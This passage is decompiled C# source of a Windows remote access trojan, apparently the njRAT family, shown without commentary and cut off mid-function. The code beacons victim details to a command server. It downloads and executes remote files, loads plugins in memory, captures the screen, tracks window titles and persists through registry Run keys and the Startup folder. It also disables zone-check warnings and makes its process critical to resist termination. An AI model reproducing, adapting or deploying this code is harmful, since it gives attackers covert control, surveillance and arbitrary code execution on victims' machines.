using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace DrHazemBasharBachir
{
	// Token: 0x02000006 RID: 6
	[StandardModule]
	internal sealed class OK
	{
		// Token: 0x0600000D RID: 13 RVA: 0x000021E6 File Offset: 0x000003E6
		[CompilerGenerated]
		[DebuggerStepThrough]
		public static void _Lambda__1(object a0)
		{
			OK.Ind((byte[])a0);
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000021F3 File Offset: 0x000003F3
		[DebuggerStepThrough]
		[CompilerGenerated]
		public static void _Lambda__2(object a0, SessionEndingEventArgs a1)
		{
			OK.ED();
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000021FC File Offset: 0x000003FC
		public static string ACT()
		{
			string result;
			try
			{
				IntPtr foregroundWindow = OK.GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					return "";
				}
				string text = Strings.Space(checked(OK.GetWindowTextLength((long)foregroundWindow) + 1));
				OK.GetWindowText(foregroundWindow, ref text, text.Length);
				result = OK.ENB(ref text);
			}
			catch (Exception ex)
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002284 File Offset: 0x00000484
		public static string BS(ref byte[] B)
		{
			return Encoding.UTF8.GetString(B);
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00002294 File Offset: 0x00000494
		public static bool Cam()
		{
			checked
			{
				try
				{
					int num = 0;
					for (;;)
					{
						string text = null;
						short wDriver = (short)num;
						string text2 = Strings.Space(100);
						if (OK.capGetDriverDescriptionA(wDriver, ref text2, 100, ref text, 100))
						{
							break;
						}
						num++;
						if (num > 4)
						{
							goto Block_3;
						}
					}
					return true;
					Block_3:;
				}
				catch (Exception ex)
				{
				}
				return false;
			}
		}

		// Token: 0x06000012 RID: 18
		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		// Token: 0x06000013 RID: 19 RVA: 0x000022FC File Offset: 0x000004FC
		public static bool CompDir(FileInfo F1, FileInfo F2)
		{
			if (Operators.CompareString(F1.Name.ToLower(), F2.Name.ToLower(), false) == 0)
			{
				DirectoryInfo directoryInfo = F1.Directory;
				DirectoryInfo directoryInfo2 = F2.Directory;
				while (Operators.CompareString(directoryInfo.Name.ToLower(), directoryInfo2.Name.ToLower(), false) == 0)
				{
					directoryInfo = directoryInfo.Parent;
					directoryInfo2 = directoryInfo2.Parent;
					if (directoryInfo == null & directoryInfo2 == null)
					{
						return true;
					}
					if (directoryInfo == null)
					{
						return false;
					}
					if (directoryInfo2 == null)
					{
						goto IL_75;
					}
				}
				return false;
			}
			IL_75:
			return false;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002384 File Offset: 0x00000584
		public static bool connect()
		{
			OK.Cn = false;
			Thread.Sleep(2000);
			object lo = OK.LO;
			lock (lo)
			{
				try
				{
					if (OK.C != null)
					{
						try
						{
							OK.C.Close();
							OK.C = null;
						}
						catch (Exception ex)
						{
						}
					}
					try
					{
						OK.MeM.Dispose();
					}
					catch (Exception ex2)
					{
					}
				}
				catch (Exception ex3)
				{
				}
				try
				{
					OK.MeM = new MemoryStream();
					OK.C = new TcpClient();
					OK.C.ReceiveBufferSize = 204800;
					OK.C.SendBufferSize = 204800;
					OK.C.Client.SendTimeout = 10000;
					OK.C.Client.ReceiveTimeout = 10000;
					OK.C.Connect(OK.HOST(), Conversions.ToInteger(OK.P));
					OK.Cn = true;
					OK.Send(OK.inf());
					try
					{
						string text = "";
						if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")), "", false))
						{
							text = text + OK.DEB(ref OK.VN) + "\r\n";
						}
						else
						{
							string str = text;
							string text2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")));
							text = str + OK.DEB(ref text2) + "\r\n";
						}
						text = string.Concat(new string[]
						{
							text,
							OK.HOST(),
							":",
							OK.P,
							"\r\n",
							OK.DR,
							"\r\n",
							OK.EXE,
							"\r\n",
							Conversions.ToString(OK.Idr),
							"\r\n",
							Conversions.ToString(OK.IsF),
							"\r\n",
							Conversions.ToString(OK.Isu),
							"\r\n",
							Conversions.ToString(OK.BD)
						});
						OK.Send("inf" + OK.Y + OK.ENB(ref text));
					}
					catch (Exception ex4)
					{
					}
				}
				catch (Exception ex5)
				{
					OK.Cn = false;
				}
			}
			return OK.Cn;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000026BC File Offset: 0x000008BC
		public static string DEB(ref string s)
		{
			byte[] array = Convert.FromBase64String(s);
			return OK.BS(ref array);
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000026D8 File Offset: 0x000008D8
		public static void DLV(string n)
		{
			try
			{
				OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG, true).DeleteValue(n);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000273C File Offset: 0x0000093C
		public static void ED()
		{
			OK.pr(0);
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002744 File Offset: 0x00000944
		public static string ENB(ref string s)
		{
			return Convert.ToBase64String(OK.SB(ref s));
		}

		// Token: 0x06000019 RID: 25
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x0600001A RID: 26
		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

		// Token: 0x0600001B RID: 27
		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowText(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

		// Token: 0x0600001C RID: 28
		[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextLengthA", ExactSpelling = true, SetLastError = true)]
		public static extern int GetWindowTextLength(long hwnd);

		// Token: 0x0600001D RID: 29 RVA: 0x00002754 File Offset: 0x00000954
		public static object GTV(string n, object ret)
		{
			object objectValue;
			try
			{
				objectValue = RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.OpenSubKey("Software\\" + OK.RG).GetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(ret))));
			}
			catch (Exception ex)
			{
				objectValue = RuntimeHelpers.GetObjectValue(ret);
			}
			return objectValue;
		}

		// Token: 0x0600001E RID: 30 RVA: 0x000027D0 File Offset: 0x000009D0
		public static string HWD()
		{
			string result;
			try
			{
				string text = null;
				int num = 0;
				int num2 = 0;
				string text2 = null;
				string text3 = Interaction.Environ("SystemDrive") + "\\";
				int number;
				OK.GetVolumeInformation(ref text3, ref text, 0, ref number, ref num, ref num2, ref text2, 0);
				result = Conversion.Hex(number);
			}
			catch (Exception ex)
			{
				result = "ERR";
			}
			return result;
		}

		// Token: 0x0600001F RID: 31 RVA: 0x0000284C File Offset: 0x00000A4C
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void Ind(byte[] b)
		{
			string[] array = Strings.Split(OK.BS(ref b), OK.Y, -1, CompareMethod.Binary);
			checked
			{
				try
				{
					string left = array[0];
					if (Operators.CompareString(left, "ll", false) != 0)
					{
						if (Operators.CompareString(left, "prof", false) != 0)
						{
							if (Operators.CompareString(left, "rn", false) == 0)
							{
								byte[] bytes;
								if (array[2][0] == '\u001f')
								{
									try
									{
										MemoryStream memoryStream = new MemoryStream();
										int length = (array[0] + OK.Y + array[1] + OK.Y).Length;
										memoryStream.Write(b, length, b.Length - length);
										bytes = OK.ZIP(memoryStream.ToArray());
										goto IL_1DA;
									}
									catch (Exception ex)
									{
										OK.Send("MSG" + OK.Y + "Execute ERROR");
										OK.Send("bla");
										return;
									}
								}
								WebClient webClient = new WebClient();
								try
								{
									bytes = webClient.DownloadData(array[2]);
								}
								catch (Exception ex2)
								{
									OK.Send("MSG" + OK.Y + "Download ERROR");
									OK.Send("bla");
									return;
								}
								IL_1DA:
								OK.Send("bla");
								string text = Path.GetTempFileName() + "." + array[1];
								try
								{
									File.WriteAllBytes(text, bytes);
									Process.Start(text);
									OK.Send("MSG" + OK.Y + "Executed As " + new FileInfo(text).Name);
									return;
								}
								catch (Exception ex3)
								{
									Exception ex4 = ex3;
									OK.Send("MSG" + OK.Y + "Execute ERROR " + ex4.Message);
									return;
								}
							}
							if (Operators.CompareString(left, "inv", false) != 0)
							{
								if (Operators.CompareString(left, "ret", false) != 0)
								{
									if (Operators.CompareString(left, "A", false) != 0)
									{
										if (Operators.CompareString(left, "un", false) != 0)
										{
											if (Operators.CompareString(left, "up", false) == 0)
											{
												byte[] bytes2 = null;
												if (array[1][0] == '\u001f')
												{
													try
													{
														MemoryStream memoryStream2 = new MemoryStream();
														int length2 = (array[0] + OK.Y).Length;
														memoryStream2.Write(b, length2, b.Length - length2);
														bytes2 = OK.ZIP(memoryStream2.ToArray());
														goto IL_95E;
													}
													catch (Exception ex5)
													{
														OK.Send("MSG" + OK.Y + "Update ERROR");
														OK.Send("bla");
														return;
													}
												}
												WebClient webClient2 = new WebClient();
												try
												{
													bytes2 = webClient2.DownloadData(array[1]);
												}
												catch (Exception ex6)
												{
													OK.Send("MSG" + OK.Y + "Update ERROR");
													OK.Send("bla");
													return;
												}
												IL_95E:
												OK.Send("bla");
												string text2 = Path.GetTempFileName() + ".exe";
												try
												{
													OK.Send("MSG" + OK.Y + "Updating To " + new FileInfo(text2).Name);
													Thread.Sleep(2000);
													File.WriteAllBytes(text2, bytes2);
													Process.Start(text2, "..");
												}
												catch (Exception ex7)
												{
													Exception ex8 = ex7;
													OK.Send("MSG" + OK.Y + "Update ERROR " + ex8.Message);
													return;
												}
												OK.UNS();
											}
											else if (Operators.CompareString(left, "Ex", false) == 0)
											{
												if (OK.PLG == null)
												{
													OK.Send("PLG");
													int num = 0;
													while (!(OK.PLG != null | num == 20 | !OK.Cn))
													{
														num++;
														Thread.Sleep(1000);
													}
													if (OK.PLG == null | !OK.Cn)
													{
														return;
													}
												}
												object[] array2 = new object[]
												{
													b
												};
												bool[] array3 = new bool[]
												{
													true
												};
												NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), null, "ind", array2, null, null, array3, true);
												if (array3[0])
												{
													b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2[0])), typeof(byte[]));
												}
											}
											else if (Operators.CompareString(left, "PLG", false) == 0)
											{
												MemoryStream memoryStream3 = new MemoryStream();
												int length3 = (array[0] + OK.Y).Length;
												memoryStream3.Write(b, length3, b.Length - length3);
												OK.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(OK.ZIP(memoryStream3.ToArray()), "A")));
												NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), null, "H", new object[]
												{
													OK.HOST()
												}, null, null);
												NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), null, "P", new object[]
												{
													OK.P
												}, null, null);
												NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(OK.PLG), null, "c", new object[]
												{
													OK.C
												}, null, null);
											}
										}
										else
										{
											string left2 = array[1];
											if (Operators.CompareString(left2, "~", false) != 0)
											{
												if (Operators.CompareString(left2, "!", false) != 0)
												{
													if (Operators.CompareString(left2, "@", false) == 0)
													{
														OK.pr(0);
														Process.Start(OK.LO.FullName);
														ProjectData.EndApp();
													}
												}
												else
												{
													OK.pr(0);
													ProjectData.EndApp();
												}
											}
											else
											{
												OK.UNS();
											}
										}
									}
									else
									{
										Rectangle targetRect = Screen.PrimaryScreen.Bounds;
										Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
										Graphics graphics = Graphics.FromImage(bitmap);
										Size size = new Size(bitmap.Width, bitmap.Height);
										graphics.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
										try
										{
											size = new Size(32, 32);
											targetRect = new Rectangle(Cursor.Position, size);
											Cursors.Default.Draw(graphics, targetRect);
										}
										catch (Exception ex9)
										{
										}
										graphics.Dispose();
										Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
										graphics = Graphics.FromImage(bitmap2);
										graphics.DrawImage(bitmap, 0, 0, bitmap2.Width, bitmap2.Height);
										graphics.Dispose();
										MemoryStream memoryStream4 = new MemoryStream();
										string left2 = "A" + OK.Y;
										b = OK.SB(ref left2);
										memoryStream4.Write(b, 0, b.Length);
										MemoryStream memoryStream5 = new MemoryStream();
										bitmap2.Save(memoryStream5, ImageFormat.Jpeg);
										string left3 = OK.md5(memoryStream5.ToArray());
										if (Operators.CompareString(left3, OK.lastcap, false) != 0)
										{
											OK.lastcap = left3;
											memoryStream4.Write(memoryStream5.ToArray(), 0, (int)memoryStream5.Length);
										}
										else
										{
											memoryStream4.WriteByte(0);
										}
										OK.Sendb(memoryStream4.ToArray());
										memoryStream4.Dispose();
										memoryStream5.Dispose();
										bitmap.Dispose();
										bitmap2.Dispose();
									}
								}
								else
								{
									byte[] array4 = (byte[])OK.GTV(array[1], new byte[0]);
									if (array[2].Length < 10 & array4.Length == 0)
									{
										OK.Send(string.Concat(new string[]
										{
											"pl",
											OK.Y,
											array[1],
											OK.Y,
											Conversions.ToString(1)
										}));
									}
									else
									{
										if (array[2].Length > 10)
										{
											MemoryStream memoryStream6 = new MemoryStream();
											int length4 = (array[0] + OK.Y + array[1] + OK.Y).Length;
											memoryStream6.Write(b, length4, b.Length - length4);
											array4 = OK.ZIP(memoryStream6.ToArray());
											OK.STV(array[1], array4, RegistryValueKind.Binary);
										}
										OK.Send(string.Concat(new string[]
										{
											"pl",
											OK.Y,
											array[1],
											OK.Y,
											Conversions.ToString(0)
										}));
										object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(array4, "A")));
										string[] array5 = new string[5];
										array5[0] = "ret";
										array5[1] = OK.Y;
										array5[2] = array[1];
										array5[3] = OK.Y;
										int num2 = 4;
										string left2 = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), null, "GT", new object[0], null, null, null)));
										array5[num2] = OK.ENB(ref left2);
										OK.Send(string.Concat(array5));
									}
								}
							}
							else
							{
								byte[] array6 = (byte[])OK.GTV(array[1], new byte[0]);
								if (array[3].Length < 10 & array6.Length == 0)
								{
									OK.Send(string.Concat(new string[]
									{
										"pl",
										OK.Y,
										array[1],
										OK.Y,
										Conversions.ToString(1)
									}));
								}
								else
								{
									if (array[3].Length > 10)
									{
										MemoryStream memoryStream7 = new MemoryStream();
										int length5 = string.Concat(new string[]
										{
											array[0],
											OK.Y,
											array[1],
											OK.Y,
											array[2],
											OK.Y
										}).Length;
										memoryStream7.Write(b, length5, b.Length - length5);
										array6 = OK.ZIP(memoryStream7.ToArray());
										OK.STV(array[1], array6, RegistryValueKind.Binary);
									}
									OK.Send(string.Concat(new string[]
									{
										"pl",
										OK.Y,
										array[1],
										OK.Y,
										Conversions.ToString(0)
									}));
									object objectValue2 = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(OK.Plugin(array6, "A")));
									NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), null, "h", new object[]
									{
										OK.HOST()
									}, null, null);
									NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), null, "p", new object[]
									{
										OK.P
									}, null, null);
									NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), null, "osk", new object[]
									{
										array[2]
									}, null, null);
									NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue2), null, "start", new object[0], null, null, null, true);
									while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject(!OK.Cn, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue2), null, "Off", new object[0], null, null, null)), true, false))))))
									{
										Thread.Sleep(1);
									}
									NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue2), null, "off", new object[]
									{
										true
									}, null, null);
								}
							}
						}
						else
						{
							string left4 = array[1];
							if (Operators.CompareString(left4, "~", false) != 0)
							{
								if (Operators.CompareString(left4, "!", false) != 0)
								{
									if (Operators.CompareString(left4, "@", false) == 0)
									{
										OK.DLV(array[2]);
									}
								}
								else
								{
									OK.STV(array[2], array[3], RegistryValueKind.String);
									OK.Send(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject("getvalue" + OK.Y + array[1] + OK.Y, RuntimeHelpers.GetObjectValue(OK.GTV(array[1], ""))))));
								}
							}
							else
							{
								OK.STV(array[2], array[3], RegistryValueKind.String);
							}
						}
					}
					else
					{
						OK.Cn = false;
					}
				}
				catch (Exception ex10)
				{
					Exception ex11 = ex10;
					if (array.Length > 0 && (Operators.CompareString(array[0], "Ex", false) == 0 | Operators.CompareString(array[0], "PLG", false) == 0))
					{
						OK.PLG = null;
					}
					try
					{
						OK.Send(string.Concat(new string[]
						{
							"ER",
							OK.Y,
							array[0],
							OK.Y,
							ex11.Message
						}));
					}
					catch (Exception ex12)
					{
					}
				}
			}
		}

		// Token: 0x06000020 RID: 32 RVA: 0x0000358C File Offset: 0x0000178C
		public static string inf()
		{
			string text = "ll" + OK.Y;
			try
			{
				if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")), "", false))
				{
					string str = text;
					string text2 = OK.DEB(ref OK.VN) + "_" + OK.HWD();
					text = str + OK.ENB(ref text2) + OK.Y;
				}
				else
				{
					string str2 = text;
					string text3 = Conversions.ToString(RuntimeHelpers.GetObjectValue(OK.GTV("vn", "")));
					string text2 = OK.DEB(ref text3) + "_" + OK.HWD();
					text = str2 + OK.ENB(ref text2) + OK.Y;
				}
			}
			catch (Exception ex)
			{
				string str3 = text;
				string text2 = OK.HWD();
				text = str3 + OK.ENB(ref text2) + OK.Y;
			}
			try
			{
				text = text + Environment.MachineName + OK.Y;
			}
			catch (Exception ex2)
			{
				text = text + "??" + OK.Y;
			}
			try
			{
				text = text + Environment.UserName + OK.Y;
			}
			catch (Exception ex3)
			{
				text = text + "??" + OK.Y;
			}
			try
			{
				text = text + OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") + OK.Y;
			}
			catch (Exception ex4)
			{
				text = text + "??-??-??" + OK.Y;
			}
			text += OK.Y;
			try
			{
				text += OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("\u00a0 ", " ").Replace(" Win", "Win");
			}
			catch (Exception ex5)
			{
				text += "??";
			}
			text += "SP";
			try
			{
				string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, CompareMethod.Binary);
				if (array.Length == 1)
				{
					text += "0";
				}
				text += array[checked(array.Length - 1)];
			}
			catch (Exception ex6)
			{
				text += "0";
			}
			try
			{
				if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
				{
					text = text + " x64" + OK.Y;
				}
				else
				{
					text = text + " x86" + OK.Y;
				}
			}
			catch (Exception ex7)
			{
				text += OK.Y;
			}
			if (OK.Cam())
			{
				text = text + "Yes" + OK.Y;
			}
			else
			{
				text = text + "No" + OK.Y;
			}
			text = string.Concat(new string[]
			{
				text,
				OK.VR,
				OK.Y,
				"..",
				OK.Y,
				OK.ACT(),
				OK.Y
			});
			string text4 = "";
			try
			{
				foreach (string text5 in OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames())
				{
					if (text5.Length == 32)
					{
						text4 = text4 + text5 + ",";
					}
				}
			}
			catch (Exception ex8)
			{
			}
			return text + text4;
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00003A1C File Offset: 0x00001C1C
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void INS()
		{
			Thread.Sleep(1000);
			if (OK.Idr && !OK.CompDir(OK.LO, new FileInfo(Interaction.Environ(OK.DR).ToLower() + "\\" + OK.EXE.ToLower())))
			{
				try
				{
					if (File.Exists(Interaction.Environ(OK.DR) + "\\" + OK.EXE))
					{
						File.Delete(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
					}
					FileStream fileStream = new FileStream(Interaction.Environ(OK.DR) + "\\" + OK.EXE, FileMode.CreateNew);
					byte[] array = File.ReadAllBytes(OK.LO.FullName);
					fileStream.Write(array, 0, array.Length);
					fileStream.Flush();
					fileStream.Close();
					OK.LO = new FileInfo(Interaction.Environ(OK.DR) + "\\" + OK.EXE);
					Process.Start(OK.LO.FullName);
					ProjectData.EndApp();
				}
				catch (Exception ex)
				{
					ProjectData.EndApp();
				}
			}
			try
			{
				Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
			}
			catch (Exception ex2)
			{
			}
			if (OK.Isu)
			{
				try
				{
					OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
				}
				catch (Exception ex3)
				{
				}
				try
				{
					OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
				}
				catch (Exception ex4)
				{
				}
			}
			if (OK.IsF)
			{
				try
				{
					File.Copy(OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", true);
					OK.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + OK.RG + ".exe", FileMode.Open);
				}
				catch (Exception ex5)
				{
				}
			}
		}

		// Token: 0x06000022 RID: 34 RVA: 0x00003CEC File Offset: 0x00001EEC
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		public static void ko()
		{
			if (Interaction.Command() != null)
			{
				try
				{
					OK.F.Registry.CurrentUser.SetValue("di", "!");
				}
				catch (Exception ex)
				{
				}
				Thread.Sleep(5000);
			}
			bool flag = false;
			OK.MT = new Mutex(true, OK.RG, ref flag);
			if (!flag)
			{
				ProjectData.EndApp();
			}
			OK.INS();
			if (!OK.Idr)
			{
				OK.EXE = OK.LO.Name;
				OK.DR = OK.LO.Directory.Name;
			}
			new Thread(new ThreadStart(OK.RC), 1).Start();
			int num = 0;
			string left = "";
			if (OK.BD)
			{
				try
				{
					SystemEvents.SessionEnding += OK._Lambda__2;
					OK.pr(1);
				}
				catch (Exception ex2)
				{
				}
			}
			checked
			{
				for (;;)
				{
					Thread.Sleep(1000);
					if (!OK.Cn)
					{
						left = "";
					}
					Application.DoEvents();
					try
					{
						num++;
						if (num == 5)
						{
							try
							{
								Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;
							}
							catch (Exception ex3)
							{
							}
						}
						if (num >= 8)
						{
							num = 0;
							string text = OK.ACT();
							if (Operators.CompareString(left, text, false) != 0)
							{
								left = text;
								OK.Send("act" + OK.Y + text);
							}
						}
						if (OK.Isu)
						{
							try
							{
								if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.CurrentUser.GetValue(OK.sf + "\\" + OK.RG, "")), "\"" + OK.LO.FullName + "\" ..", false))
								{
									OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
								}
							}
							catch (Exception ex4)
							{
							}
							try
							{
								if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(OK.F.Registry.LocalMachine.GetValue(OK.sf + "\\" + OK.RG, "")), "\"" + OK.LO.FullName + "\" ..", false))
								{
									OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, "\"" + OK.LO.FullName + "\" ..");
								}
							}
							catch (Exception ex5)
							{
							}
						}
					}
					catch (Exception ex6)
					{
					}
				}
			}
		}

		// Token: 0x06000023 RID: 35 RVA: 0x0000408C File Offset: 0x0000228C
		public static string AES_Decrypt(string input, string pass)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			string result = "";
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array2 = Convert.FromBase64String(input);
				result = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00004134 File Offset: 0x00002334
		public static string md5(byte[] B)
		{
			B = new MD5CryptoServiceProvider().ComputeHash(B);
			string text = "";
			foreach (byte b in B)
			{
				text += b.ToString("x2");
			}
			return text;
		}

		// Token: 0x06000025 RID: 37
		[DllImport("ntdll")]
		public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x06000026 RID: 38 RVA: 0x0000417C File Offset: 0x0000237C
		public static object Plugin(byte[] b, string c)
		{
			foreach (Module module in Assembly.Load(b).GetModules())
			{
				foreach (Type type in module.GetTypes())
				{
					if (type.FullName.EndsWith("." + c))
					{
						return module.Assembly.CreateInstance(type.FullName);
					}
				}
			}
			return null;
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000041FC File Offset: 0x000023FC
		public static void pr(int i)
		{
			try
			{
				OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x0000424C File Offset: 0x0000244C
		public static void RC()
		{
			checked
			{
				for (;;)
				{
					OK.lastcap = "";
					if (OK.C != null)
					{
						long num = -1L;
						int num2 = 0;
						try
						{
							for (;;)
							{
								IL_19:
								num2++;
								if (num2 == 10)
								{
									num2 = 0;
									Thread.Sleep(1);
								}
								if (!OK.Cn)
								{
									break;
								}
								if (OK.C.Available < 1)
								{
									OK.C.Client.Poll(-1, SelectMode.SelectRead);
								}
								while (OK.C.Available > 0)
								{
									if (num == -1L)
									{
										string text = "";
										for (;;)
										{
											int num3 = OK.C.GetStream().ReadByte();
											if (num3 == -1)
											{
												goto IL_8D;
											}
											if (num3 == 0)
											{
												break;
											}
											text += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(num3).ToString()));
										}
										num = Conversions.ToLong(text);
										if (num == 0L)
										{
											OK.Send("");
											num = -1L;
										}
										if (OK.C.Available <= 0)
										{
											goto IL_19;
										}
									}
									else
									{
										OK.b = new byte[OK.C.Available + 1 - 1 + 1];
										long num4 = num - OK.MeM.Length;
										if (unchecked((long)OK.b.Length) > num4)
										{
											OK.b = new byte[(int)(num4 - 1L) + 1 - 1 + 1];
										}
										int count = OK.C.Client.Receive(OK.b, 0, OK.b.Length, SocketFlags.None);
										OK.MeM.Write(OK.b, 0, count);
										if (OK.MeM.Length == num)
										{
											num = -1L;
											Thread thread = new Thread(new ParameterizedThreadStart(OK._Lambda__1), 1);
											thread.Start(OK.MeM.ToArray());
											thread.Join(100);
											OK.MeM.Dispose();
											OK.MeM = new MemoryStream();
											goto IL_19;
										}
										goto IL_19;
									}
								}
								break;
							}
							IL_8D:;
						}
						catch (Exception ex)
						{
						}
					}
					do
					{
						try
						{
							if (OK.PLG != null)
							{
								NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(OK.PLG), null, "clear", new object[0], null, null, null, true);
								OK.PLG = null;
							}
						}
						catch (Exception ex2)
						{
						}
						OK.Cn = false;
					}
					while (!OK.connect());
					OK.Cn = true;
				}
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000044C4 File Offset: 0x000026C4
		public static byte[] SB(ref string S)
		{
			return Encoding.UTF8.GetBytes(S);
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000044D2 File Offset: 0x000026D2
		public static bool Send(string S)
		{
			return OK.Sendb(OK.SB(ref S));
		}

		// Token: 0x0600002B RID: 43 RVA: 0x000044E0 File Offset: 0x000026E0
		public static bool Sendb(byte[] b)
		{
			bool result;
			if (!OK.Cn)
			{
				result = false;
			}
			else
